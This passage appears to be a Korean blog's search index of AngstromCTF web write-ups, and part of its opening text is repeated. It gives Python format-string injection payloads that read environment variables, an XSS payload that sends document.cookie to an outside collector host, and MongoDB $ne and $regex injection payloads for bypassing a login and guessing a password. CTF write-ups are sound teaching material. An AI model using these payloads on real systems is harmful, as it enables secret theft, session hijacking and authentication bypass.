request.args 부분은 조작이 불가능하지만, 대상 문자열은 마음대로 사용자의 입력대로 들어가므로 이를 이용해서, os.environ 을 읽어내면 해결되는 문제이다!</p><p>다만 format 함수의 대상이 되는 문자열의 중괄호 안에서 메소드 호출은 불가능하므로 메소드를 사용하지 않고 문제를 해결할 수 있어야 한다.</p><p>os 모듈의 environ 속성에 환경변수가 저장되어있으니 이를 참조해 주자.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get environ</span></span><br><span class="line">&#123;args.get.__globals__[mimetypes].os.environ&#125;</span><br><span class="line">&#123;args.__init__.__globals__[mimetypes].os.environ&#125;</span><br><span class="line">&#123;args.__class__.__init__.__globals__[mimetypes].os.environ&#125;</span><br><span class="line">&#123;args.__class__.__base__.__init__.__globals__[mimetypes].os.environ&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># only python2 (not this challenge)</span></span><br><span class="line">&#123;args.get.func_globals[mimetypes].os.environ&#125;</span><br><span class="line">&#123;args.__init__.func_globals[mimetypes].os.environ&#125;</span><br><span class="line">&#123;args.__class__.__init__.func_globals[mimetypes].os.environ&#125;</span><br><span class="line">&#123;args.__class__.__base__.__init__.func_globals[mimetypes].os.environ&#125;</span><br></pre></td></tr></table></figure><p>AngstromCTF, Format String Injection, python, Web python format string injection 문제이다. 강조된 문장에서 볼 수 있듯 args 변수에 request.args 를 대입하여 format 메소드의 인자로 이용하는데 request.args 부분은 조작이 불가능하지만, 대상 문자열은 마음대로 사용자의 입력대로 들어가므로 이를 이용해서, os.environ 을 읽어내면 해결되는 문제이다!</p><p>다만 format 함수의 대상이 되는 문자열의 중괄호 안에서 메소드 호출은 불가능하므로 메소드를 사용하지 않고 문제를 해결할 수 있어야 한다.</p><p>os 모듈의 environ 속성에 환경변수가 저장되어있으니 이를 참조해 주자.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get environ</span></span><br><span class="line">&#123;args.get.__globals__[mimetypes].os.environ&#125;</span><br><span class="line">&#123;args.__init__.__globals__[mimetypes].os.environ&#125;</span><br><span class="line">&#123;args.__class__.__init__.__globals__[mimetypes].os.environ&#125;</span><br><span class="line">&#123;args.__class__.__base__.__init__.__globals__[mimetypes].os.environ&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># only python2 (not this challenge)</span></span><br><span class="line">&#123;args.get.func_globals[mimetypes].os.environ&#125;</span><br><span class="line">&#123;args.__init__.func_globals[mimetypes].os.environ&#125;</span><br><span class="line">&#123;args.__class__.__init__.func_globals[mimetypes].os.environ&#125;</span><br><span class="line">&#123;args.__class__.__base__.__init__.func_globals[mimetypes].os.environ&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AngstromCTF </tag>
            
            <tag> Format String Injection </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AngstromCTF - DOM Validator</title>
      <link href="/angstromctf-dom-validator/"/>
      <url>/angstromctf-dom-validator/</url>
      
        <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!----&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"location='https://postb.in/xxxxxxxx?'+document.cookie"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>XSS 필터링 문제인데, <code>&lt;head&gt;</code> 태그에서 자바스크립트로 문서 내용을 해싱하여 비교 검증하는 특이한 방식을 사용했다. 시도하다 보니 필터링 로직이 복잡하여 짜여 있다는 것을 알게 되었는데, 본래 복잡해질수록 허점도 생기는 법 아니겠는가.. 여러가지 페이로드를 확인해보니 결국 먹히는 것이 나왔다. (3시간 정도 걸렸다)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;its_all_relative&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AngstromCTF </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AngstromCTF - no sequel 2</title>
      <link href="/angstromctf-no-sequel-2/"/>
      <url>/angstromctf-no-sequel-2/</url>
      
        <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">app.use(bodyParser.json());</span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/login'</span>, verifyJwt, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// monk instance</span></span><br><span class="line">    <span class="keyword">var</span> db = req.db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> user = req.body.username;</span><br><span class="line">    <span class="keyword">var</span> pass = req.body.password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!user || !pass)&#123;</span><br><span class="line">        res.send(<span class="string">"One or more fields were not provided."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> query = &#123;</span><br><span class="line">        username: user,</span><br><span class="line">        password: pass</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    db.collection(<span class="string">'users'</span>).findOne(query, <span class="function"><span class="keyword">function</span> (<span class="params">err, user</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!user)&#123;</span><br><span class="line">            res.send(<span class="string">"Wrong username or password"</span>);</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.cookie(<span class="string">'token'</span>, jwt.sign(&#123;<span class="attr">name</span>: user.username, <span class="attr">authenticated</span>: <span class="literal">true</span>&#125;, secret));</span><br><span class="line">        res.redirect(<span class="string">"/site"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>이전 문제와 동일하다. 하지만 인증 우회에 그쳤던 것과 다르게, 이젠 실제 비밀번호를 요구한다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; find length</span><br><span class="line">&#123; &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &#123; &quot;$regex&quot; : &quot;.&#123;14&#125;&quot; &#125; &#125;</span><br><span class="line">&#x2F;&#x2F; find charset</span><br><span class="line">&#123; &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &#123; &quot;$regex&quot; : &quot;^[a-z]*$&quot; &#125; &#125;</span><br><span class="line">&#x2F;&#x2F; find character</span><br><span class="line">&#123; &quot;username&quot; : &quot;admin&quot;, &quot;password&quot; : &#123; &quot;$regex&quot; : &quot;^a&quot; &#125; &#125;</span><br></pre></td></tr></table></figure><p>정규식 쿼리를 이용하면 간단한데 길이를 먼저 확인하고 브루트 포싱을 해보면 금방 답이 나온다.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AngstromCTF </tag>
            
            <tag> MongoDB </tag>
            
            <tag> NoSQL </tag>
            
            <tag> SQLI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AngstromCTF - no sequel 1</title>
      <link href="/angstromctf-no-sequel-1/"/>
      <url>/angstromctf-no-sequel-1/</url>
      
        <content type="html"><![CDATA[<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">app.use(bodyParser.json());</span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">router.post(<span class="string">'/login'</span>, verifyJwt, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// monk instance</span></span><br><span class="line">    <span class="keyword">var</span> db = req.db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> user = req.body.username;</span><br><span class="line">    <span class="keyword">var</span> pass = req.body.password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!user || !pass)&#123;</span><br><span class="line">        res.send(<span class="string">"One or more fields were not provided."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> query = &#123;</span><br><span class="line">        username: user,</span><br><span class="line">        password: pass</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    db.collection(<span class="string">'users'</span>).findOne(query, <span class="function"><span class="keyword">function</span> (<span class="params">err, user</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!user)&#123;</span><br><span class="line">            res.send(<span class="string">"Wrong username or password"</span>);</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.cookie(<span class="string">'token'</span>, jwt.sign(&#123;<span class="attr">name</span>: user.username, <span class="attr">authenticated</span>: <span class="literal">true</span>&#125;, secret));</span><br><span class="line">        res.redirect(<span class="string">"/site"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>Express 로 구성된 서버에 소스가 주어진다.</p><p>상단에 monk instance 라고 적혀있는데, mongodb 를 사용했다는 것을 말하고 싶었으리라.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// request</span></span><br><span class="line">username[$ne]=&amp;password[$ne]=</span><br><span class="line"><span class="comment">// query</span></span><br><span class="line">&#123; <span class="string">"username"</span> : &#123; <span class="string">"$ne"</span> : <span class="string">""</span> &#125;, <span class="string">"password"</span> : &#123; <span class="string">"$ne"</span> : <span class="string">""</span> &#125; &#125;</span><br></pre></td></tr></table></figure><p>흔한 mongodb 취약점인데 위처럼 배열을 삽입해주면 not equal 비교를 통해 인증이 우회된다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">One or more fields were not provided.</span><br></pre></td></tr></table></figure><p>시도해보니 배열은 입력으로 받지 않는 모양이었지만</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Host: nosequels.2019.chall.actf.co</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; Rigor&#x2F;1.0.0; http:&#x2F;&#x2F;rigor.com)</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Cookie: token&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRoZW50aWNhdGVkIjpmYWxzZSwiaWF0IjoxNTU1OTk5MjU3fQ.cy_aJUBpx5BQCaJqHgbS3noRrHPZUtJT4lpnOrFMJR4</span><br><span class="line">Content-Length: 60</span><br><span class="line"></span><br><span class="line">&#123; &quot;username&quot; : &#123; &quot;$ne&quot; : &quot;&quot; &#125;, &quot;password&quot; : &#123; &quot;$ne&quot; : &quot;&quot; &#125; &#125;</span><br></pre></td></tr></table></figure><p>Content-Type을 수정하여 데이터를 json형태로 전송함으로써 인젝션에 성공하였다.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AngstromCTF </tag>
            
            <tag> MongoDB </tag>
            
            <tag> NoSQL </tag>
            
            <tag> SQLI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
